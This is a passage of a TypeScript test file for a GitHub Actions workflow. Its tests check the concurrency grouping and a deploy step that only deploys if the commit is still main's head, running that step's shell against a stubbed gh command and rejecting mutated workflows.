  const format = (template: string, ...args: unknown[]) => template.replace(/\{(\d)\}/g, (_match, i: string) => String(args[Number(i)]));
  const evaluate = (value: string) =>
    value.replace(/\$\{\{ (.*?) \}\}/g, (_match, expression: string) => {
      expect(expression, 'only the characters the concurrency expressions use').toMatch(/^[\w.'\s&|=!(),{}-]+$/);
      const js = expression.replace(/==/g, '===').replace(/!=/g, '!==');
      return String(new Function('github', 'format', `return (${js});`)(github, format));
    });
  return { group: evaluate(block![1]!), cancel: evaluate(block![2]!) };
}

/** What lets a run other than main's own push share main's group, or lets anything but a pull request cancel a run. */
function concurrencyProblems(text: string): string[] {
  const main = concurrencyOf(text, { event_name: 'push', ref: MAIN_REF, run_id: 1 });
  const problems: string[] = [];
  if (main.group !== `CI-${MAIN_REF}`) problems.push(`a push to main is grouped as ${main.group}`);
  if (main.cancel !== 'false') problems.push('a push to main cancels in progress');
  // A merged pull request's `closed` run reports the base branch as its ref, and the dispatch is run on main.
  const others: [string, RunKind][] = [
    ['a closed, merged pull request', { event_name: 'pull_request', ref: MAIN_REF, run_id: 2, pull_request: 7 }],
    ['an open pull request', { event_name: 'pull_request', ref: 'refs/pull/7/merge', run_id: 3, pull_request: 7 }],
    ['a dispatch on main', { event_name: 'workflow_dispatch', ref: MAIN_REF, run_id: 4 }],
    ['another dispatch on main', { event_name: 'workflow_dispatch', ref: MAIN_REF, run_id: 5 }],
    ['a dispatch on a branch', { event_name: 'workflow_dispatch', ref: 'refs/heads/other', run_id: 6 }],
    ['a kind of event nobody listed', { event_name: 'schedule', ref: MAIN_REF, run_id: 8 }],
  ];
  const groups = new Map<string, string>();
  for (const [name, run] of others) {
    const { group, cancel } = concurrencyOf(text, run);
    if (group === main.group) problems.push(`${name} shares main's group`);
    if (run.event_name !== 'pull_request' && groups.has(group)) problems.push(`${name} shares a group with ${groups.get(group)}`);
    groups.set(group, name);
    if ((cancel === 'true') !== (run.event_name === 'pull_request')) problems.push(`${name}: cancel-in-progress is ${cancel}`);
  }
  if (concurrencyOf(text, others[0]![1]).group !== concurrencyOf(text, others[1]![1]).group) problems.push('a pull request is not grouped by its number');
  return problems;
}

describe('the concurrency group', () => {
  test('puts a pull request in its own group, main in the ref group, and everything else in a group of its own, cancelling only for a pull request', () => {
    expect(concurrencyOf(CI, { event_name: 'pull_request', ref: MAIN_REF, run_id: 2, pull_request: 7 })).toEqual({ group: 'CI-pr-7', cancel: 'true' });
    expect(concurrencyOf(CI, { event_name: 'push', ref: MAIN_REF, run_id: 1 })).toEqual({ group: `CI-${MAIN_REF}`, cancel: 'false' });
    expect(concurrencyOf(CI, { event_name: 'workflow_dispatch', ref: MAIN_REF, run_id: 4242 })).toEqual({ group: 'CI-workflow_dispatch-4242', cancel: 'false' });
    expect(concurrencyProblems(CI)).toEqual([]);
  });

  test.each([
    ['a dispatch run shares main\'s group', (text: string) => mutated(text, " || github.event_name == 'push' && github.ref || format('{0}-{1}', github.event_name, github.run_id)", ' || github.ref'), "a dispatch on main shares main's group"],
    ['a dispatch run is grouped by event alone, so two share one', (text: string) => mutated(text, "format('{0}-{1}', github.event_name, github.run_id)", 'github.event_name'), 'another dispatch on main shares a group with a dispatch on main'],
    ['a dispatch run cancels in progress', (text: string) => mutated(text, "cancel-in-progress: ${{ github.event_name == 'pull_request' }}", "cancel-in-progress: ${{ github.event_name != 'push' }}"), 'a dispatch on main: cancel-in-progress is true'],
    ['everything cancels in progress', (text: string) => mutated(text, "cancel-in-progress: ${{ github.event_name == 'pull_request' }}", 'cancel-in-progress: true'), 'a push to main cancels in progress'],
    ['everything is grouped by ref, as before', (text: string) => mutated(text, "github.event_name == 'pull_request' && format('pr-{0}', github.event.pull_request.number) || github.event_name == 'push' && github.ref || format('{0}-{1}', github.event_name, github.run_id)", 'github.ref'), "a closed, merged pull request shares main's group"],
    ['a pull request is grouped by ref', (text: string) => mutated(text, "github.event_name == 'pull_request' && format('pr-{0}', github.event.pull_request.number) || ", ''), 'a pull request is not grouped by its number'],
  ])('refuses a workflow where %s', (_name, mutate, problem) => {
    expect(concurrencyProblems(mutate(CI))).toContain(problem);
  });
});

// The step's shell, run as Actions runs it (bash -e) against a stub gh: a .mjs on PATH, so no
// GitHub API is called. Not run where there is no bash.
const BASH = process.platform !== 'win32';
const STUB_GH = [
  '#!/usr/bin/env node',
  "import { appendFileSync } from 'node:fs';",
  'const args = process.argv.slice(2);',
  'appendFileSync(process.env.STUB_LOG, `${JSON.stringify(args)} with ${process.env.GH_TOKEN}\\n`);',
  'if (args.join(" ") !== `api repos/${process.env.REPO}/git/ref/heads/main --jq .object.sha`) {',
  '  console.error(`unexpected arguments: ${args.join(" ")}`);',
  '  process.exit(2);',
  '}',
  'if (process.env.STUB_FAIL) {',
  '  console.error("gh: HTTP 502");',
  '  process.exit(1);',
  '}',
  'process.stdout.write(`${process.env.STUB_HEAD}\\n`);',
].join('\n');
const SHA_A = 'a'.repeat(40);
const SHA_B = 'b'.repeat(40);

/** Runs a head-check script against the stub: what it printed, how it exited, and what it wrote to GITHUB_OUTPUT. */
function runHeadCheck(script: string, stub: { head?: string; fail?: boolean }) {
  const dir = mkdtempSync(join(tmpdir(), 'head-check-'));
  try {
    writeFileSync(join(dir, 'gh.mjs'), STUB_GH, { mode: 0o755 });
    symlinkSync(join(dir, 'gh.mjs'), join(dir, 'gh'));
    writeFileSync(join(dir, 'step.sh'), script);
    writeFileSync(join(dir, 'output'), '');
    const result = spawnSync('bash', ['-e', join(dir, 'step.sh')], {
      encoding: 'utf8',
      env: {
        PATH: `${dir}:${process['env'].PATH}`,
        GH_TOKEN: 'job-token',
        REPO: 'example-owner/example-repo',
        SHA: SHA_A,
        GITHUB_OUTPUT: join(dir, 'output'),
        STUB_LOG: join(dir, 'log'),
        STUB_HEAD: stub.head ?? '',
        ...(stub.fail ? { STUB_FAIL: '1' } : {}),
      },
    });
    const log = existsSync(join(dir, 'log')) ? readFileSync(join(dir, 'log'), 'utf8') : '';
    return { status: result.status, stdout: result.stdout, stderr: result.stderr, output: readFileSync(join(dir, 'output'), 'utf8'), log };
  } finally {
    for (const name of ['gh', 'gh.mjs', 'step.sh', 'output', 'log']) rmSync(join(dir, name), { force: true });
    rmdirSync(dir);
  }
}

/** What is wrong with deploy's head check, in ci.yml's text `text`. */
function headCheckProblems(text: string): string[] {
  const all = steps(jobBlocks('ci.yml', text).get('deploy') ?? '');
  const at = all.findIndex((step) => stepValue(step, 'id') === 'head');
  if (at === -1) return ['deploy has no step with the id head'];
  const step = all[at]!;
  const script = scalar(step, 'run', 8) ?? '';
  const problems: string[] = [];
  if (script !== HEAD_CHECK) problems.push('the head check is not the pinned script');
  if (script.includes('${{')) problems.push('the head check interpolates an expression into its script');
  const env = mapping(step, 'env', 8);
  for (const [key, value] of [['GH_TOKEN', '${{ github.token }}'], ['REPO', '${{ github.repository }}'], ['SHA', '${{ github.sha }}']] as const) {
    if (env.get(key) !== value) problems.push(`the head check's ${key} is ${env.get(key)}, not ${value}`);
  }
  if (stepValue(step, 'if') !== ENABLED) problems.push("the head check does not run exactly when the token is there");
  // Before anything that uses the token: only the skip notice may come first.
  for (const earlier of all.slice(0, at)) if (!NOTICE.test(scalar(earlier, 'run', 8) ?? '')) problems.push(`step ${all.indexOf(earlier) + 1} comes before the head check`);
  // Every later step waits for its answer.
  all.slice(at + 1).forEach((later, i) => {
    if (stepValue(later, 'if') !== AT_HEAD) problems.push(`step ${at + 2 + i} does not wait for the head check`);
  });
  if (BASH) {
    const same = runHeadCheck(script, { head: SHA_A });
    if (same.status !== 0 || same.output !== 'current=true\n' || same.stdout.includes('::notice')) problems.push(`the same SHA does not go on: ${JSON.stringify(same)}`);
    const newer = runHeadCheck(script, { head: SHA_B });
    if (newer.status !== 0 || newer.output !== 'current=false\n' || !newer.stdout.includes(`::notice title=Deploy skipped::main's head is now ${SHA_B}`)) {
      problems.push(`a different SHA does not skip with the notice: ${JSON.stringify(newer)}`);
    }
    for (const [name, stub] of [['gh failing', { fail: true }], ['an empty answer', { head: '' }]] as const) {
      const failed = runHeadCheck(script, stub);
      if (failed.status === 0 || failed.output.includes('current=true')) problems.push(`${name} does not fail the job: ${JSON.stringify(failed)}`);
    }
  }
  return problems;
}

describe("deploy's head check", () => {
  test('is the first step with a token: it reads main\'s head with the job\'s own GITHUB_TOKEN, and every later step waits for it', () => {
    expect(headCheckProblems(CI)).toEqual([]);
  });

  test.skipIf(!BASH)('runs as Actions runs it, against a stub gh: same SHA goes on, a different one skips with the notice, a failed read fails', () => {
    const same = runHeadCheck(HEAD_CHECK, { head: SHA_A });
    expect(same).toMatchObject({ status: 0, output: 'current=true\n', stdout: '' });
    expect(same.log).toBe('["api","repos/example-owner/example-repo/git/ref/heads/main","--jq",".object.sha"] with job-token\n');
    const newer = runHeadCheck(HEAD_CHECK, { head: SHA_B });
    expect(newer).toMatchObject({ status: 0, output: 'current=false\n' });
    expect(newer.stdout).toBe(`::notice title=Deploy skipped::main's head is now ${SHA_B}, not ${SHA_A}; deploy it from the run for ${SHA_B}, and re-run that run if it did not deploy\n`);
    const failed = runHeadCheck(HEAD_CHECK, { fail: true });
    expect(failed.status).toBe(1);
    expect(failed.output).toBe('');
    expect(failed.stdout).toContain("::error::could not read main's head, so nothing deploys");
  });

  test.each([
    ['the check is removed', (text: string) => mutated(text, /      - name: Stop unless this commit is main's head[\s\S]*?(?=      - name: Check out the trusted config)/.exec(text)![0], ''), 'deploy has no step with the id head'],
    ['a failed read skips instead of failing', (text: string) => mutated(text, '            exit 1\n          fi\n          if [ "$head"', '            echo "current=false" >> "$GITHUB_OUTPUT"\n            exit 0\n          fi\n          if [ "$head"'), BASH ? 'gh failing does not fail the job' : 'the head check is not the pinned script'],
    ['a failed read has a fallback', (text: string) => mutated(text, '--jq .object.sha)" || [ -z "$head" ]; then', '--jq .object.sha || true)" || [ -z "$head" ]; then'), 'the head check is not the pinned script'],
    ['a different SHA still goes on', (text: string) => mutated(text, 'if [ "$head" = "$SHA" ]; then', 'if [ -n "$head" ]; then'), BASH ? 'a different SHA does not skip with the notice' : 'the head check is not the pinned script'],
    ['wrangler runs whatever the check found', (text: string) => mutated(text, `      - if: ${AT_HEAD}\n        uses: cloudflare/wrangler-action@`, `      - if: ${ENABLED}\n        uses: cloudflare/wrangler-action@`), 'does not wait for the head check'],
    ['the checkout comes before the check', reorderedHeadCheck, 'comes before the head check'],
    ['the token is interpolated into the script', (text: string) => mutated(text, 'gh api "repos/$REPO/', 'GH_TOKEN=${{ github.token }} gh api "repos/$REPO/'), 'the head check interpolates an expression into its script'],
  ])('refuses a workflow where %s', (_name, mutate, problem) => {
    expect(headCheckProblems(mutate(CI)).join('\n')).toContain(problem);
  });
});

/** ci.yml with the head check moved after the trusted checkout. */
function reorderedHeadCheck(text: string): string {
  const check = /      - name: Stop unless this commit is main's head[\s\S]*?(?=      - name: Check out the trusted config)/.exec(text)![0];
  const checkout = /      - name: Check out the trusted config[\s\S]*?(?=      # No npm cache)/.exec(text)![0];
  return mutated(text, check + checkout, checkout + check);
}
